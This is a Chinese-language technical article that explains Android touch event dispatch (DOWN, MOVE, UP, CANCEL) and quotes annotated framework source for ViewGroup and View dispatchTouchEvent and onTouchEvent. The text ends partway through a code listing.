<table><thead><tr><th>事件类型 (Action)</th><th>触发条件 (Trigger Condition)</th><th>触发频率 (Frequency)</th><th>对事件流的影响</th><th>核心用途</th></tr></thead><tbody><tr><td>ACTION_DOWN</td><td>手指初次接触屏幕</td><td>仅 1 次</td><td>生死关口：若返回 false，后续事件不再传给此 View</td><td>记录起点坐标、重置状态、申明消费意向</td></tr><tr><td>ACTION_MOVE</td><td>手指在屏幕上滑动</td><td>多次 (高频)</td><td>持续更新，反映手指轨迹</td><td>计算位移、实现拖拽、判断是否触发滑动阈值</td></tr><tr><td>ACTION_UP</td><td>手指离开屏幕</td><td>仅 1 次</td><td>正常终点：标志整个手势序列圆满结束</td><td>触发点击事件 (onClick)、执行回弹动画</td></tr><tr><td>ACTION_CANCEL</td><td>事件流被父布局拦截</td><td>最多 1 次</td><td>非正常终点：强制终止当前 View 的事件处理</td><td>状态重置（如取消按钮高亮），防止逻辑出错</td></tr></tbody></table>
<h4 data-id="heading-2">事件详细解析</h4>
<p><strong>ACTION_DOWN：事件流的“敲门砖”</strong></p>
<ul>
<li>
<p><strong>触发条件</strong>：这是所有触摸事件的源头。每当一根手指接触屏幕时触发。</p>
</li>
<li>
<p><strong>消费机制</strong>：这是 View 唯一一次能决定“要不要处理这个序列”的机会。</p>
<ul>
<li><strong>如果你在</strong> <strong><code>ACTION_DOWN</code></strong> <strong>时返回了</strong> <strong><code>false</code></strong> <strong>，系统会认为你对这个任务不感兴趣，接下来的</strong> <strong><code>MOVE</code></strong> <strong>、</strong> <strong><code>UP</code></strong> <strong>统统不会再发给你</strong>。</li>
<li><strong>比喻</strong>：就像公司的派活，如果你拒绝了开头，那后续所有的进度汇报和结尾都没你的事了。</li>
</ul>
</li>
</ul>
<h4 data-id="heading-3">ACTION_MOVE：高频的“过程量”</h4>
<ul>
<li>
<p><strong>触发条件</strong>：只要手指按下后在屏幕上移动，甚至是微小的抖动。</p>
</li>
<li>
<p><strong>多次触发</strong>：它的触发频率极高（通常 16ms 或 8ms 一次，取决于屏幕刷新率）[每刷新一次屏幕就需要计算两次的位移差]。</p>
</li>
<li>
<p><strong>注意事项</strong>：</p>
<ul>
<li><strong>性能</strong>：不要在 <code>MOVE</code> 里面写大量的计算逻辑、创建大量对象或进行数据库操作，否则会导致 UI 卡顿。</li>
<li><strong>阈值 (TouchSlop)</strong> ：通常我们会判断滑动距离是否超过系统定义的 <code>mTouchSlop</code>（通常是 8dp 左右），来决定这是不是一次有效的“滑动”，还是只是手指的轻微震颤。</li>
</ul>
</li>
</ul>
<h4 data-id="heading-4">ACTION_UP：完美的“收尾”</h4>
<ul>
<li>
<p><strong>触发条件</strong>：最后一根手指离开屏幕。</p>
</li>
<li>
<p><strong>逻辑处理</strong>：</p>
<ul>
<li>Android 的 <code>onClick</code>（点击监听）就是在 <code>UP</code> 里面判断的。如果手指按下到抬起的位移很小，且时长符合要求，系统就会在内部调用 <code>performClick()</code>。</li>
<li>它是释放资源、结束动画的最佳时机。</li>
</ul>
</li>
</ul>
<h4 data-id="heading-5">ACTION_CANCEL：无奈的“被截胡”</h4>
<ul>
<li>
<p><strong>触发条件</strong>：这个事件比较特殊，它不是由用户直接触发的，而是由<strong>父布局</strong>产生的。</p>
<ul>
<li><strong>典型场景</strong>：你在一个 <code>RecyclerView</code>（列表）里按住了一个按钮，刚开始触发了 <code>DOWN</code>。但接着你向上滑动，父容器 <code>RecyclerView</code> 觉得你要滚动列表，于是它强行拦截了事件（<code>onInterceptTouchEvent</code> 返回 <code>true</code>）。</li>
<li>此时，按钮会收到一个 <code>ACTION_CANCEL</code>，告诉它：“活儿被老板接管了，你洗洗睡吧。”</li>
</ul>
</li>
<li>
<p><strong>重要性</strong>：View 收到此事件时必须<strong>重置状态</strong>。比如按钮本来是按压变色的，收到 <code>CANCEL</code> 后必须变回原色，否则按钮会一直卡在“按下”的状态。</p>
</li>
</ul>
<p><strong>也就是说事件从触摸开始，经历滑动，最后以手指抬起结果。也就是说DOWN事件是其他事件的开始没有DOWN事件就没有其他事件的发生</strong></p>
<h2 data-id="heading-6">事件分发的关键函数</h2>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">dispatchTouchEvent</span>()、<span class="hljs-built_in">onInterceptTouchEvent</span>()、<span class="hljs-built_in">onTouchEvent</span>()
</code></pre>
<h2 data-id="heading-7">dispatchTouchEvent</h2>
<p>负责分发事件，View和ViewGroup上有不同的表现</p>
<p>ViewGroup的dispatchTouchEvent会向子View分发事件，如果子View不处理再交给父View处理，此时也会调用ViewGroup父View的disptachTouchEvent方法(ViewGroup继承于View,此时调用的是父类的方法）</p>
<h3 data-id="heading-8">ViewGroup的dispatchTouchEvent</h3>
<p><strong>dispatchTouchEvent是一个返回</strong> <strong>布尔值</strong> <strong>的函数，通过返回临时变量handled值，默认赋值为false</strong></p>
<p><strong>对于DOWN,MOVE,UP事件的会进入不同的分发链</strong></p>
<p>了解分发链前我们需要重点关注的几个变量</p>
<p>intercepted-&gt;判断是否需要拦截</p>
<pre><code class="hljs language-ini" lang="ini">final boolean intercepted<span class="hljs-comment">;</span>
if (<span class="hljs-attr">actionMasked</span> == MotionEvent.ACTION_DOWN
        || mFirstTouchTarget != null) {
        //这个标黄的标志位，是后面内部拦截法requestDisallowInterceptTouchEvent() 的关键
    final boolean <span class="hljs-attr">disallowIntercept</span> = (mGroupFlags &amp; FLAG_DISALLOW_INTERCEPT) != <span class="hljs-number">0</span><span class="hljs-comment">;</span>
    if (!disallowIntercept) {
    //这里调用onInterceptTouchEvent方法
        <span class="hljs-attr">intercepted</span> = <span class="hljs-literal">on</span>InterceptTouchEvent(ev)<span class="hljs-comment">;</span>
        ev.setAction(action)<span class="hljs-comment">; // restore action in case it was changed</span>
    } else {
        <span class="hljs-attr">intercepted</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
    }
} else {

    <span class="hljs-attr">intercepted</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
}
</code></pre>
<p>mFirstTouchTarget-&gt;消费DOWN事件子View的位置</p>
<p>newTouchTarget-&gt;新手指的触摸位置</p>
<h4 data-id="heading-9"><strong>DOWN事件在dispatchTouchEvent主要流程</strong></h4>
<pre><code class="hljs language-ini" lang="ini">TouchTarget <span class="hljs-attr">newTouchTarget</span> = null<span class="hljs-comment">;//每次循环前清空</span>
boolean <span class="hljs-attr">alreadyDispatchedToNewTouchTarget</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;//注意这个参数</span>
final boolean <span class="hljs-attr">canceled</span> = resetCancelNextUpFlag(this)
        || <span class="hljs-attr">actionMasked</span> == MotionEvent.ACTION_CANCEL<span class="hljs-comment">;</span>
if (!canceled &amp;&amp; !intercepted) {

    View <span class="hljs-attr">childWithAccessibilityFocus</span> = ev.isTargetAccessibilityFocus()
            ? findChildWithAccessibilityFocus() : null<span class="hljs-comment">;</span>

    if (<span class="hljs-attr">actionMasked</span> == MotionEvent.ACTION_DOWN
|| (split &amp;&amp; <span class="hljs-attr">actionMasked</span> == MotionEvent.ACTION_POINTER_DOWN)
            || <span class="hljs-attr">actionMasked</span> == MotionEvent.ACTION_HOVER_MOVE) {
        final int <span class="hljs-attr">actionIndex</span> = ev.getActionIndex()<span class="hljs-comment">; // always 0 for down</span>
        final int <span class="hljs-attr">idBitsToAssign</span> = split ? <span class="hljs-number">1</span> &lt;&lt; ev.getPointerId(actionIndex)
                : TouchTarget.ALL_POINTER_IDS<span class="hljs-comment">;</span>

        removePointersFromTouchTargets(idBitsToAssign)<span class="hljs-comment">;</span>

        final int <span class="hljs-attr">childrenCount</span> = mChildrenCount<span class="hljs-comment">;</span>
        if (<span class="hljs-attr">newTouchTarget</span> == null &amp;&amp; childrenCount != <span class="hljs-number">0</span>) {
            final float <span class="hljs-attr">x</span> = ev.getXDispatchLocation(actionIndex)<span class="hljs-comment">;</span>
            final float <span class="hljs-attr">y</span> = ev.getYDispatchLocation(actionIndex)<span class="hljs-comment">;</span>
         
            final ArrayList&lt;View&gt; <span class="hljs-attr">preorderedList</span> = buildTouchDispatchChildList()<span class="hljs-comment">;</span>
            final boolean <span class="hljs-attr">customOrder</span> = preorderedList == null
                    &amp;&amp; isChildrenDrawingOrderEnabled()<span class="hljs-comment">;</span>
            final View<span class="hljs-section">[]</span> <span class="hljs-attr">children</span> = mChildren<span class="hljs-comment">;</span>
            //从右往左遍历
            for (int <span class="hljs-attr">i</span> = childrenCount - <span class="hljs-number">1</span><span class="hljs-comment">; i &gt;= 0; i--) {</span>
                final int <span class="hljs-attr">childIndex</span> = getAndVerifyPreorderedIndex(
                        childrenCount, i, customOrder)<span class="hljs-comment">;</span>
                final View <span class="hljs-attr">child</span> = getAndVerifyPreorderedView(
                        preorderedList, children, childIndex)<span class="hljs-comment">;</span>

              
                if (childWithAccessibilityFocus != null) {
                    if (childWithAccessibilityFocus != child) {
                        continue<span class="hljs-comment">;</span>
                    }
                    <span class="hljs-attr">childWithAccessibilityFocus</span> = null<span class="hljs-comment">;</span>
                    <span class="hljs-attr">i</span> = childrenCount<span class="hljs-comment">;</span>
                }

                if (!child.canReceivePointerEvents()
                        || !isTransformedTouchPointInView(x, y, child, null)) {
                    ev.setTargetAccessibilityFocus(false)<span class="hljs-comment">;</span>
                    continue<span class="hljs-comment">;</span>
                }
//如果这个手指位置已经存在会直接跳出循环
                <span class="hljs-attr">newTouchTarget</span> = getTouchTarget(child)<span class="hljs-comment">;</span>
                if (newTouchTarget != null) {
                    newTouchTarget.pointerIdBits |= idBitsToAssign<span class="hljs-comment">;</span>
                    break<span class="hljs-comment">;</span>
                }

//最关键代码
                resetCancelNextUpFlag(child)<span class="hljs-comment">;</span>
                //这个方法会调用子View的dispatchTouchevent来判断是否消费事件
                if (dispatchTransformedTouchEvent(ev, false, child, idBitsToAssign)) {
                    // Child wants to receive touch within its <span class="hljs-attr">bounds.
                    mLastTouchDownTime</span> = ev.getDownTime()<span class="hljs-comment">;</span>
                    if (preorderedList != null) {
                        for (int <span class="hljs-attr">j</span> = <span class="hljs-number">0</span><span class="hljs-comment">; j &lt; childrenCount; j++) {</span>
                            if (children<span class="hljs-section">[childIndex]</span> == mChildren<span class="hljs-section">[j]</span>) {
                                <span class="hljs-attr">mLastTouchDownIndex</span> = j<span class="hljs-comment">;</span>
                                break<span class="hljs-comment">;</span>
                            }
                        }
                    } else {
                        <span class="hljs-attr">mLastTouchDownIndex</span> = childIndex<span class="hljs-comment">;</span>
                    }
                    <span class="hljs-attr">mLastTouchDownX</span> = x<span class="hljs-comment">;</span>
                    <span class="hljs-attr">mLastTouchDownY</span> = y<span class="hljs-comment">;</span>
                    //关键调用函数
                    <span class="hljs-attr">newTouchTarget</span> = addTouchTarget(child, idBitsToAssign)<span class="hljs-comment">;</span>
                    //开始提到的参数
                    <span class="hljs-attr">alreadyDispatchedToNewTouchTarget</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
                    break<span class="hljs-comment">;</span>
                }
                
                ev.setTargetAccessibilityFocus(false)<span class="hljs-comment">;</span>
            }
            if (preorderedList != null) preorderedList.clear()<span class="hljs-comment">;</span>
        }
//多指触控逻辑 :既然没找到新的 View 接收这根手指，就把这根手指分配给“最老”的那个负责人
        if (<span class="hljs-attr">newTouchTarget</span> == null &amp;&amp; mFirstTouchTarget != null) {
            <span class="hljs-attr">newTouchTarget</span> = mFirstTouchTarget<span class="hljs-comment">;</span>
            while (newTouchTarget.next != null) {
                <span class="hljs-attr">newTouchTarget</span> = newTouchTarget.next<span class="hljs-comment">;</span>
            }
            newTouchTarget.pointerIdBits |= idBitsToAssign<span class="hljs-comment">;</span>
        }
    }
}
//如果DOWN事件没有被子View消费mFirstTouchTarget就为空此时由父View来处理
    if (<span class="hljs-attr">mFirstTouchTarget</span> == null) {
        <span class="hljs-attr">handled</span> = dispatchTransformedTouchEvent(ev, canceled, null,
                TouchTarget.ALL_POINTER_IDS)<span class="hljs-comment">;</span>
    } else {
    //如果DOWN事件被子View消费
        TouchTarget <span class="hljs-attr">predecessor</span> = null<span class="hljs-comment">;</span>
        TouchTarget <span class="hljs-attr">target</span> = mFirstTouchTarget<span class="hljs-comment">;</span>
        while (target != null) {
            final TouchTarget <span class="hljs-attr">next</span> = target.next<span class="hljs-comment">;</span>
            //DOWN事件并且DOWN被子View消费情况下这里的alreadyDispatchedToNewTouchTarget就为true，返回handled值，防止重复分发
            if (alreadyDispatchedToNewTouchTarget &amp;&amp; <span class="hljs-attr">target</span> == newTouchTarget) {
                <span class="hljs-attr">handled</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
            } else {
               ......
    }

   
}
private TouchTarget addTouchTarget(@NonNull View child, int pointerIdBits) {
    final TouchTarget <span class="hljs-attr">target</span> = TouchTarget.obtain(child, pointerIdBits)<span class="hljs-comment">;</span>
    <span class="hljs-attr">target.next</span> = mFirstTouchTarget<span class="hljs-comment">;</span>
    //给mFirstTouchTarget赋值 后面会对mFirstTouchTarget的值进行判断这个参数很重要
    <span class="hljs-attr">mFirstTouchTarget</span> = target<span class="hljs-comment">;</span>
    return target<span class="hljs-comment">;</span>
}
</code></pre>
<h4 data-id="heading-10">MOVE事件在dispatchTouchEvent主要流程</h4>
<p>intercepted-&gt;判断是否需要拦截</p>
<p>mFirstTouchTarget-&gt;消费DOWN事件子View的位置</p>
<p>newTouchTarget-&gt;新手指的触摸位置</p>
<pre><code class="hljs language-ini" lang="ini">//如果前面的DOWN事件没有子View消费，这里会直接进入else分支
//即<span class="hljs-attr">intercepted</span> = <span class="hljs-literal">true</span> if (!canceled &amp;&amp; !intercepted) {},巧妙的跳过了这里的遍历流程

final boolean intercepted<span class="hljs-comment">;</span>
if (<span class="hljs-attr">actionMasked</span> == MotionEvent.ACTION_DOWN
        || mFirstTouchTarget != null) {
        //这个标黄的标志位，是后面内部拦截法requestDisallowInterceptTouchEvent() 的关键
    final boolean <span class="hljs-attr">disallowIntercept</span> = (mGroupFlags &amp; FLAG_DISALLOW_INTERCEPT) != <span class="hljs-number">0</span><span class="hljs-comment">;</span>
    if (!disallowIntercept) {
        <span class="hljs-attr">intercepted</span> = <span class="hljs-literal">on</span>InterceptTouchEvent(ev)<span class="hljs-comment">;</span>
        ev.setAction(action)<span class="hljs-comment">; </span>
    } else {
        <span class="hljs-attr">intercepted</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
    }
} else {

    <span class="hljs-attr">intercepted</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
}
</code></pre>
<pre><code class="hljs language-ini" lang="ini">//------前置参数  这是一个200行的大方法，不要忘了必要的参数
final boolean intercepted<span class="hljs-comment">;</span>
final boolean <span class="hljs-attr">canceled</span> = resetCancelNextUpFlag(this)
        || <span class="hljs-attr">actionMasked</span> == MotionEvent.ACTION_CANCEL<span class="hljs-comment">;</span>
 boolean <span class="hljs-attr">alreadyDispatchedToNewTouchTarget</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;//注意这个参数</span>
//------正式代码
//MOVE分发下：如果前面的DOWN事件没有子View消费，这里会调用ViewGroup的dispatchTouchEvent(也就是decorView的onTouchEvent方法最后调用activity的onTouchEvent方法)
    if (<span class="hljs-attr">mFirstTouchTarget</span> == null) {
    //这里不仅可以是DOWN的结果也可以是MOVE的结果(结合前文)
       <span class="hljs-attr">1. handled</span> = dispatchTransformedTouchEvent(ev, canceled, null,
                TouchTarget.ALL_POINTER_IDS)<span class="hljs-comment">;</span>
    } else {
//这里MOVE分为两种情况，正常MOVE和MOVE事件被拦截，这里使用两种颜色的字体表示 灰色正常 绿色MOVE拦截    由于这篇文字是在飞书上写的所以颜色不对，请见谅.
        TouchTarget <span class="hljs-attr">predecessor</span> = null<span class="hljs-comment">;</span>
        TouchTarget <span class="hljs-attr">target</span> = mFirstTouchTarget<span class="hljs-comment">;</span>
        //这里的循环是为了做多指触控，本来mFirstTouchTarget就是ViewGruop指向一个View的单向链表，由于有多指的情况，这样的链表有几对
        while (target != null) {
            final TouchTarget <span class="hljs-attr">next</span> = target.next<span class="hljs-comment">;</span>
            //只有在DOWN事件的情况下才有可能为true，所以MOVE事件不会到这里面去
            if (alreadyDispatchedToNewTouchTarget &amp;&amp; <span class="hljs-attr">target</span> == newTouchTarget) {
            <span class="hljs-attr">2.    handled</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
            } 
//DOWN事件分发所有可能的结果只能到这里 要么是1.  要么是2.           
            else {
            //这里有个误区，这里是不需要考虑前面DOWN事件没有被子View消费的情况的，因为已经被这段代码开头的if判断清除了，所以这里的intercepted是通过 <span class="hljs-attr">intercepted</span> = <span class="hljs-literal">on</span>InterceptTouchEvent(ev)<span class="hljs-comment">;这里得到的</span>
            
            //resetCancelNextUpFlag这里用来避免子View出现的意外情况，一旦子View发生意外，不让子VieW消费事件 比如下面这些情况
            //当一个 View 正在被按下时，它突然被从父容器中移除了（detach）
            //或者 View 的状态发生了剧烈变化，导致系统认为它不应该再产生点击效果
                final boolean <span class="hljs-attr">cancelChild</span> = resetCancelNextUpFlag(target.child)
                        || intercepted<span class="hljs-comment">;</span>
                 //根据前面的target定向寻找子View,判断是否消费事件，这个就是我们之前一直说的mFirstTouchTarget
                 //如果这里cancelChild为true,会子View分发CANCEL终止分发
                if (dispatchTransformedTouchEvent(ev, cancelChild,
                        target.child, target.pointerIdBits)) {
                    <span class="hljs-attr">handled</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
                }
                //如果cancelChild为true置空链表
                if (cancelChild) {
                    if (<span class="hljs-attr">predecessor</span> == null) {
                        <span class="hljs-attr">mFirstTouchTarget</span> = next<span class="hljs-comment">;</span>
                    } else {
                        <span class="hljs-attr">predecessor.next</span> = next<span class="hljs-comment">;</span>
                    }
                    target.recycle()<span class="hljs-comment">;</span>
                    <span class="hljs-attr">target</span> = next<span class="hljs-comment">;</span>
                    continue<span class="hljs-comment">;</span>
                }
            }
            //循环遍历操作
            <span class="hljs-attr">predecessor</span> = target<span class="hljs-comment">;</span>
            <span class="hljs-attr">target</span> = next<span class="hljs-comment">;</span>
        }
    }

}
</code></pre>
<h4 data-id="heading-11">UP事件在dispatchTouchEvent主要流程</h4>
<p>MOVE事件与UP事件的流程高度重合唯一区别就是UP事件需要清空之前的状态便于迎接下一次事件的到来</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// --- 这段代码处理 UP，但不处理 MOVE ---</span>
if (canceled
        || actionMasked == MotionEvent.ACTION_UP // 【UP 走这里】
        || actionMasked == MotionEvent.ACTION_HOVER_MOVE) {
    <span class="hljs-built_in">resetTouchState</span>(); <span class="hljs-comment">// 重置所有状态，清空链表</span>
} 
<span class="hljs-comment">// --- 这段处理多指抬起 ---</span>
else if (split &amp;&amp; actionMasked == MotionEvent.ACTION_POINTER_UP) {
    <span class="hljs-built_in">removePointersFromTouchTargets</span>(idBitsToRemove);
}
</code></pre>
<h4 data-id="heading-12">CANCEL事件在dispatchTouchEvent主要流程</h4>
<p>CANCEL事件的处理比较简单了，理解了前面MOVE的流程，这里就一目了然了</p>
<pre><code class="hljs language-ini" lang="ini">if (<span class="hljs-attr">mFirstTouchTarget</span> == null) {
    <span class="hljs-attr">handled</span> = dispatchTransformedTouchEvent(ev, canceled, null,
            TouchTarget.ALL_POINTER_IDS)<span class="hljs-comment">;</span>
} else {

    TouchTarget <span class="hljs-attr">predecessor</span> = null<span class="hljs-comment">;</span>
    TouchTarget <span class="hljs-attr">target</span> = mFirstTouchTarget<span class="hljs-comment">;</span>
    while (target != null) {
        final TouchTarget <span class="hljs-attr">next</span> = target.next<span class="hljs-comment">;</span>
        if (alreadyDispatchedToNewTouchTarget &amp;&amp; <span class="hljs-attr">target</span> == newTouchTarget) {
            <span class="hljs-attr">handled</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
        } else {
//这里   cancelChild为true     
            final boolean <span class="hljs-attr">cancelChild</span> = resetCancelNextUpFlag(target.child)
                    || intercepted<span class="hljs-comment">;</span>
            if (dispatchTransformedTouchEvent(ev, cancelChild,
                    target.child, target.pointerIdBits)) {
                <span class="hljs-attr">handled</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
            }
            //链表清除
            if (cancelChild) {
                if (<span class="hljs-attr">predecessor</span> == null) {
                    <span class="hljs-attr">mFirstTouchTarget</span> = next<span class="hljs-comment">;</span>
                } else {
                    <span class="hljs-attr">predecessor.next</span> = next<span class="hljs-comment">;</span>
                }
                target.recycle()<span class="hljs-comment">;</span>
                <span class="hljs-attr">target</span> = next<span class="hljs-comment">;</span>
                continue<span class="hljs-comment">;</span>
            }
        }
        <span class="hljs-attr">predecessor</span> = target<span class="hljs-comment">;</span>
        <span class="hljs-attr">target</span> = next<span class="hljs-comment">;</span>
    }
}
</code></pre>
<h4 data-id="heading-13">dispatchTransformedTouchEvent</h4>
<p>这个函数在dispatchTouchEvent里面被反复使用我们来看看长什么样</p>
<pre><code class="hljs language-ini" lang="ini">private boolean dispatchTransformedTouchEvent(MotionEvent event, boolean cancel,
        View child, int desiredPointerIdBits) {
    final boolean handled<span class="hljs-comment">;</span>

//如果cancel为true，分发CANCEL事件，对应之前MOVE分发代码的片段
/*
 final boolean <span class="hljs-attr">cancelChild</span> = resetCancelNextUpFlag(target.child)
                       || intercepted<span class="hljs-comment">;</span>
if (dispatchTransformedTouchEvent(ev, cancelChild,target.child, target.pointerIdBits)) {
                    <span class="hljs-attr">handled</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;}</span>
*/                
    final int <span class="hljs-attr">oldAction</span> = event.getAction()<span class="hljs-comment">;</span>
    if (cancel || <span class="hljs-attr">oldAction</span> == MotionEvent.ACTION_CANCEL) {
        event.setAction(MotionEvent.ACTION_CANCEL)<span class="hljs-comment">;</span>
        if (<span class="hljs-attr">child</span> == null) {
            <span class="hljs-attr">handled</span> = super.dispatchTouchEvent(event)<span class="hljs-comment">;</span>
        } else {
            <span class="hljs-attr">handled</span> = child.dispatchTouchEvent(event)<span class="hljs-comment">;</span>
        }
        //这里进行还原事件处理，防止给后面的View分发CANCEL事件
        event.setAction(oldAction)<span class="hljs-comment">;</span>
        return handled<span class="hljs-comment">;</span>
    }
//-----------正常情况 可以看到都是调用dispatchTouchEvent方法的逻辑-----------------
    // Calculate the number of pointers to deliver.
    final int <span class="hljs-attr">oldPointerIdBits</span> = event.getPointerIdBits()<span class="hljs-comment">;</span>
    final int <span class="hljs-attr">newPointerIdBits</span> = oldPointerIdBits &amp; desiredPointerIdBits<span class="hljs-comment">;</span>


    if (<span class="hljs-attr">newPointerIdBits</span> == <span class="hljs-number">0</span>) {
        return false<span class="hljs-comment">;</span>
    }

    final MotionEvent transformedEvent<span class="hljs-comment">;</span>
    if (<span class="hljs-attr">newPointerIdBits</span> == oldPointerIdBits) {
        if (<span class="hljs-attr">child</span> == null || child.hasIdentityMatrix()) {
            if (<span class="hljs-attr">child</span> == null) {
                <span class="hljs-attr">handled</span> = super.dispatchTouchEvent(event)<span class="hljs-comment">;</span>
            } else {
                final float <span class="hljs-attr">offsetX</span> = mScrollX - child.mLeft<span class="hljs-comment">;</span>
                final float <span class="hljs-attr">offsetY</span> = mScrollY - child.mTop<span class="hljs-comment">;</span>
                event.offsetLocation(offsetX, offsetY)<span class="hljs-comment">;</span>

                <span class="hljs-attr">handled</span> = child.dispatchTouchEvent(event)<span class="hljs-comment">;</span>

                event.offsetLocation(-offsetX, -offsetY)<span class="hljs-comment">;</span>
            }
            return handled<span class="hljs-comment">;</span>
        }
        <span class="hljs-attr">transformedEvent</span> = MotionEvent.obtain(event)<span class="hljs-comment">;</span>
    } else {
        <span class="hljs-attr">transformedEvent</span> = event.split(newPointerIdBits)<span class="hljs-comment">;</span>
    }

    // Perform any necessary transformations and dispatch.
    if (<span class="hljs-attr">child</span> == null) {
        <span class="hljs-attr">handled</span> = super.dispatchTouchEvent(transformedEvent)<span class="hljs-comment">;</span>
    } else {
        final float <span class="hljs-attr">offsetX</span> = mScrollX - child.mLeft<span class="hljs-comment">;</span>
        final float <span class="hljs-attr">offsetY</span> = mScrollY - child.mTop<span class="hljs-comment">;</span>
        transformedEvent.offsetLocation(offsetX, offsetY)<span class="hljs-comment">;</span>
        if (! child.hasIdentityMatrix()) {
            transformedEvent.transform(child.getInverseMatrix())<span class="hljs-comment">;</span>
        }

        <span class="hljs-attr">handled</span> = child.dispatchTouchEvent(transformedEvent)<span class="hljs-comment">;</span>
    }

    // Done.
    transformedEvent.recycle()<span class="hljs-comment">;</span>
    return handled<span class="hljs-comment">;</span>
}
</code></pre>
<p>我们发现这个方法也是通过handled变量返回布尔值</p>
<h3 data-id="heading-14">View的dispatchTouchEvent</h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function"><span class="hljs-keyword">public</span> boolean <span class="hljs-title">dispatchTouchEvent</span>(<span class="hljs-params">MotionEvent <span class="hljs-keyword">event</span></span>)</span> {
    <span class="hljs-comment">// If the event should be handled by accessibility focus first.</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">event</span>.isTargetAccessibilityFocus()) {
        <span class="hljs-comment">// We don't have focus or no virtual descendant has it, do not handle the event.</span>
        <span class="hljs-keyword">if</span> (!isAccessibilityFocusedViewOrHost()) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        <span class="hljs-comment">// We have focus and got the event, then use normal event dispatch.</span>
        <span class="hljs-keyword">event</span>.setTargetAccessibilityFocus(<span class="hljs-literal">false</span>);
    }
    boolean result = <span class="hljs-literal">false</span>;

    <span class="hljs-keyword">if</span> (mInputEventConsistencyVerifier != <span class="hljs-literal">null</span>) {
        mInputEventConsistencyVerifier.onTouchEvent(<span class="hljs-keyword">event</span>, <span class="hljs-number">0</span>);
    }

    final <span class="hljs-built_in">int</span> actionMasked = <span class="hljs-keyword">event</span>.getActionMasked();
    <span class="hljs-keyword">if</span> (actionMasked == MotionEvent.ACTION_DOWN) {
        <span class="hljs-comment">// 新手势开始，停止之前的嵌套滚动（如清理之前的滑动惯性）</span>
        stopNestedScroll();
    }
 -----------------------------------关键代码---------------------------------------------
<span class="hljs-comment">//onFilterTouchEventForSecurity：这是一个安全机制。如果系统检测到当前 View 上方覆盖了不安全的窗口（例如透明悬浮窗），为了保护隐私，可能会直接丢弃该事件。</span>
    <span class="hljs-keyword">if</span> (onFilterTouchEventForSecurity(<span class="hljs-keyword">event</span>)) {
       
<span class="hljs-comment">// 如果用户点在滚动条上并尝试拖拽，滚动条逻辑会先“截活”，result 变为 true。       </span>
        <span class="hljs-keyword">if</span> ((mViewFlags &amp; ENABLED_MASK) == ENABLED &amp;&amp; handleScrollBarDragging(<span class="hljs-keyword">event</span>)) {
            result = <span class="hljs-literal">true</span>;
        }
<span class="hljs-comment">/*优先级最高。
只要满足：
设置了 OnTouchListener。
View 处于 Enabled 状态（注意：禁用的 View 无法触发 onTouch）。
onTouch 返回了 true。
那么 result 为 true，后续的 onTouchEvent 就不会被执行了
*/</span>            
        ListenerInfo li = mListenerInfo;
        <span class="hljs-keyword">if</span> (li != <span class="hljs-literal">null</span> &amp;&amp; li.mOnTouchListener != <span class="hljs-literal">null</span>
                &amp;&amp; (mViewFlags &amp; ENABLED_MASK) == ENABLED
&amp;&amp; li.mOnTouchListener.onTouch(<span class="hljs-keyword">this</span>, <span class="hljs-keyword">event</span>)) {
            result = <span class="hljs-literal">true</span>;
        }

        <span class="hljs-keyword">if</span> (!result &amp;&amp; onTouchEvent(<span class="hljs-keyword">event</span>)) {
            result = <span class="hljs-literal">true</span>;
        }
    }
---------------------------------------------------------------------------------------    
    
<span class="hljs-comment">// 如果没有 View 消费事件，记录到校验器</span>
    <span class="hljs-keyword">if</span> (!result &amp;&amp; mInputEventConsistencyVerifier != <span class="hljs-literal">null</span>) {
        mInputEventConsistencyVerifier.onUnhandledEvent(<span class="hljs-keyword">event</span>, <span class="hljs-number">0</span>);
    }

<span class="hljs-comment">// 判定手势是否结束</span>
    <span class="hljs-keyword">if</span> (actionMasked == MotionEvent.ACTION_UP ||
            actionMasked == MotionEvent.ACTION_CANCEL ||
            (actionMasked == MotionEvent.ACTION_DOWN &amp;&amp; !result)) {
        stopNestedScroll();
    }

    <span class="hljs-keyword">return</span> result;
}
</code></pre>
<p>我们看到View的dispatchTouchEvent方法多次调用了<strong>onTouchEvent</strong>方法再看看这个方法</p>
<h2 data-id="heading-15">View的onTouchEvent</h2>
<p>关键代码部分：</p>
<h4 data-id="heading-16"><strong>可点击状态下的处理</strong></h4>
<p>只要可点击，就消费事件</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">final</span> boolean clickable <span class="hljs-operator">=</span> ((viewFlags <span class="hljs-operator">&amp;</span> <span class="hljs-type">CLICKABLE</span>) <span class="hljs-operator">==</span> <span class="hljs-type">CLICKABLE</span>
        <span class="hljs-operator">||</span> (viewFlags <span class="hljs-operator">&amp;</span> <span class="hljs-type">LONG_CLICKABLE</span>) <span class="hljs-operator">==</span> <span class="hljs-type">LONG_CLICKABLE</span>)
        <span class="hljs-operator">||</span> (viewFlags <span class="hljs-operator">&amp;</span> <span class="hljs-type">CONTEXT_CLICKABLE</span>) <span class="hljs-operator">==</span> <span class="hljs-type">CONTEXT_CLICKABLE</span>;

<span class="hljs-comment">// ... 在方法末尾 ...</span>
<span class="hljs-keyword">if</span> (clickable <span class="hljs-operator">||</span> (viewFlags <span class="hljs-operator">&amp;</span> <span class="hljs-type">TOOLTIP</span>) <span class="hljs-operator">==</span> <span class="hljs-type">TOOLTIP</span>) {
    <span class="hljs-comment">// ... switch case ...</span>
